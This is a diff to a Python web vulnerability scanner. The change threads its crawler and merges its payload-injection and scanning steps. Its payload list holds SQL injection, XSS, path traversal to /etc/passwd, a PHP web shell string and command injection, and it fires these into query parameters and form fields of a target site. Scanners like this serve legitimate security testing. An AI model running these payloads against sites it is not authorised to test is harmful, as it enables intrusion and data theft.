@@ -1,11 +1,3 @@
-import requests
-from bs4 import BeautifulSoup
-from urllib.parse import urlparse, urljoin, parse_qs
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from colorama import Fore, Style
-from itertools import islice
-from urllib.robotparser import RobotFileParser
-from bs4 import MarkupResemblesLocatorWarning
 import time
 import logging
 import tqdm
@@ -14,18 +6,33 @@ import random
 import re
 import urllib3
 import signal
+import requests
+import sys
+import os
+import concurrent.futures
+import threading
+import asyncio
+import aiohttp
+from bs4 import BeautifulSoup
+from urllib.parse import urlparse, urljoin, parse_qs
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from colorama import Fore, Style
+from itertools import islice
+from urllib.robotparser import RobotFileParser
+from bs4 import MarkupResemblesLocatorWarning
 
 warnings.filterwarnings("ignore")
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
     # Add more user agents if desired
 ]
-
+session = requests.Session()
+session.verify = True  # Enable SSL certificate verification
+session.headers = {
+    "User-Agent": random.choice(USER_AGENTS),
+}
 payloads = [
     "'; SELECT * FROM users; --",
     "<script>alert('XSS')</script>",
@@ -33,12 +40,13 @@ payloads = [
     "malicious_payload.php",
     "admin' OR '1'='1",
     "../../../../etc/passwd%00",
-    "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
     "<img src=x onerror=alert('XSS')>",
     "<?php system($_GET['cmd']); ?>",
     "../../../../etc/passwd",
     "evil_script.js",
-    "maliciouspayload.php",
+    ";ls",
+    "ls",
+    "admin.php",
     "robots.txt",
     "adminer.php",
     "phpmyadmin",
@@ -362,28 +370,13 @@ def check_rfi(url):
 
 
 session = requests.Session()
-session.verify = False  # Skip SSL verification
+session.verify = True  # Skip SSL verification
 session.headers = {
     "User-Agent": random.choice(USER_AGENTS),
 }
 
 
-
-
-def extract_urls_from_html(html, base_url):
-    urls = set()
-    try:
-        soup = BeautifulSoup(html, "html.parser")
-        for anchor in soup.find_all("a"):
-            href = anchor.get("href")
-            if href:
-                href = urljoin(base_url, href)
-                urls.add(href)
-    except Exception as e:
-        logging.error(f"Failed to extract URLs from HTML: {e}")
-    return urls
-
-def collect_urls(target_url):
+def collect_urls(target_url, num_threads=5):
     parsed_target_url = urlparse(target_url)
     target_domain = parsed_target_url.netloc
 
@@ -391,46 +384,69 @@ def collect_urls(target_url):
     processed_urls = set()
     urls.add(target_url)
 
-    with tqdm.tqdm(total=1, desc="Collecting URLs", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}") as pbar:
-        while urls:
-            current_url = urls.pop()
+    processed_urls_lock = threading.Lock()  # Added lock for thread safety
 
-            parsed_current_url = urlparse(current_url)
-            current_domain = parsed_current_url.netloc
+    def extract_urls_from_html(html, base_url):
+        soup = BeautifulSoup(html, 'html.parser')
+        extracted_urls = set()
+        for link in soup.find_all('a', href=True):
+            url = link['href']
+            absolute_url = urljoin(base_url, url)
+            extracted_urls.add(absolute_url)
+        return extracted_urls
 
-            if current_domain != target_domain and not current_domain.endswith("." + target_domain):
-                continue
+    def filter_urls(urls, target_domain, processed_urls):
+        filtered_urls = set()
+        for url in urls:
+            parsed_url = urlparse(url)
+            domain = parsed_url.netloc
+            if domain == target_domain or domain.endswith("." + target_domain):
+                if url not in processed_urls:
+                    filtered_urls.add(url)
+        return filtered_urls
 
-            if current_url in processed_urls:
-                continue
+    def process_url(current_url):
+        nonlocal urls, processed_urls
+        try:
+            if current_url.startswith("javascript:"):
+                return set()  # Skip JavaScript URLs
 
-            processed_urls.add(current_url)
+            response = requests.get(current_url)  # Enable SSL certificate verification by removing 'verify=False'
+            if response.status_code == 200:
+                extracted_urls = extract_urls_from_html(response.text, current_url)
+                filtered_urls = filter_urls(extracted_urls, target_domain, processed_urls)
 
-            try:
-                if current_url.startswith("javascript:"):
-                    continue  # Skip JavaScript URLs
+                with processed_urls_lock:  # Use a lock to ensure thread safety when updating the set
+                    processed_urls.update(filtered_urls)
 
-                response = requests.get(current_url, verify=False)  # Disable SSL certificate verification
-                if response.status_code == 200:
-                    extracted_urls = extract_urls_from_html(response.text, target_url)
-                    urls.update(extracted_urls)
-            except requests.exceptions.RequestException as e:
-                logging.error(f"Request Exception for URL: {current_url}, Error: {e}")
+                urls.update(filtered_urls)
+        except requests.exceptions.RequestException as e:
+            logging.error(f"Request Exception for URL: {current_url}, Error: {e}")
+        except Exception as e:
+            logging.error(f"Error occurred for URL: {current_url}, Error: {e}")
 
-            pbar.total = len(urls) + len(processed_urls)
-            pbar.update(1)
+        return set()
+
+    with tqdm.tqdm(total=len(urls), desc="Collecting URLs", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}") as pbar:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+            while urls:
+                current_urls = list(urls)  # Convert set to a list for concurrent processing
+                urls.clear()
+
+                futures = [executor.submit(process_url, url) for url in current_urls]
+                for future in concurrent.futures.as_completed(futures):
+                    try:
+                        filtered_urls = future.result()
+                        urls.update(filtered_urls)
+                    except Exception as e:
+                        logging.error(f"Error occurred while processing URL: {e}")
+
+                pbar.total = len(urls) + len(processed_urls)
+                pbar.update(len(current_urls))
 
     return processed_urls
   
-def filter_urls(urls, target_domain, processed_urls):
-    filtered_urls = set()
-    for url in urls:
-        parsed_url = urlparse(url)
-        if parsed_url.netloc == target_domain and url not in processed_urls:
-            filtered_urls.add(url)
-    return filtered_urls
-
-def inject_payloads(url, payloads):
+def scan_and_inject_payloads(url):
     parsed_url = urlparse(url)
     base_url = parsed_url.scheme + "://" + parsed_url.netloc
     params = parse_qs(parsed_url.query)
@@ -446,37 +462,18 @@ def inject_payloads(url, payloads):
             injected_params = params.copy()
             param_values = injected_params.get(param)
             if param_values is not None:
-                injected_params[param] = [param_value + payload for param_value in param_values]
+                for i in range(len(param_values)):
+                    param_values[i] += payload
+
                 injected_url = url.split("?")[0] + "?" + "&".join(
                     f"{key}={value}" for key, value in injected_params.items()
                 )
-                scan_url(injected_url)
+                response = requests.get(injected_url)
+                scan_response(response)
 
     response = requests.get(url)
     scan_response(response)
 
-    parsed_url = urlparse(url)
-    base_url = parsed_url.scheme + "://" + parsed_url.netloc
-    params = parse_qs(parsed_url.query)
-
-    processed_parameters = set()
-    for param in params:
-        if param in processed_parameters:
-            continue
-
-        processed_parameters.add(param)
-
-        for payload in payloads:
-            injected_params = params.copy()
-            param_values = injected_params.get(param)
-            if param_values is not None:
-                injected_params[param] = [param_value + payload for param_value in param_values]
-                injected_url = url.split("?")[0] + "?" + "&".join(
-                    f"{key}={value}" for key, value in injected_params.items()
-                )
-                scan_url(injected_url)
-
-    response = requests.get(url)
     soup = BeautifulSoup(response.text, "html.parser")
     forms = soup.find_all("form")
     for form in forms:
@@ -502,35 +499,6 @@ def inject_payloads(url, payloads):
                         injected_fields[field] = field_value + payload
                         response = requests.post(form_action, data=injected_fields)
                         scan_response(response)
-
-def scan_url(url):
-    if check_sqli(url):
-        logging.warning(f"SQLI: {url}")
-    if check_rce(url):
-        logging.warning(f"RCE: {url}")
-    if check_xss(url):
-        logging.warning(f"XSS: {url}")
-    if check_lfi(url):
-        logging.warning(f"LFI: {url}")
-    if check_open_redirect(url):
-        logging.warning(f"Open Redirect: {url}")
-    if check_backup_files(url):
-        logging.warning(f"Backup Files: {url}")
-    if check_database_exposure(url):
-        logging.warning(f"Database Exposure: {url}")
-    if check_directory_listings(url):
-        logging.warning(f"Directory Listings: {url}")
-    if check_sensitive_information(url):
-        logging.warning(f"Sensitive Information exposure: {url}")
-    if check_xxe(url):
-        logging.warning(f"XXE: {url}")
-    if check_ssrf(url):
-        logging.warning(f"SSRF: {url}")
-    if check_rfi(url):
-        logging.warning(f"RFI: {url}")
-    if check_log_files(url):
-        logging.warning(f"Log File Disclosure: {url}")
-
 
 def scan_response(response):
     if check_sqli(response.url):
@@ -591,7 +559,7 @@ def main():
         target_url = "http://" + target_url
 
     session = requests.Session()
-    session.verify = False  # Skip SSL verification
+    session.verify = True  # Skip SSL verification
     session.headers = {
         "User-Agent": random.choice(USER_AGENTS),
     }
@@ -603,24 +571,13 @@ def main():
 
     print_info("Scanning collected URLs for vulnerabilities...")
     pbar = tqdm.tqdm(total=len(urls), desc="Scanning URLs", unit="URL")
-    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
-        futures = [executor.submit(scan_url, url) for url in urls]
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        futures = [executor.submit(scan_and_inject_payloads, url) for url in urls]
         for future in as_completed(futures):
             try:
                 future.result()
             except Exception as e:
                 logging.error(f"Error occurred while scanning URL: {e}")
-            pbar.update(1)
-
-    print_info("Injecting payloads into parameters, query, and form inputs...")
-    pbar = tqdm.tqdm(total=len(urls), desc="Injecting Payloads", unit="URL")
-    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
-        futures = [executor.submit(inject_payloads, url, payloads) for url in urls]
-        for future in as_completed(futures):
-            try:
-                future.result()
-            except Exception as e:
-                logging.error(f"Error occurred while injecting payloads: {e}")
             pbar.update(1)
 
     pbar.close()
@@ -639,9 +596,7 @@ def main():
 
     try:
         for url in urls:
-            scan_url(url)
-        for url in urls:
-            inject_payloads(url, payloads)
+            scan_and_inject_payloads(url)
 
         # Scanning completed
         print_info("Scanning completed!")
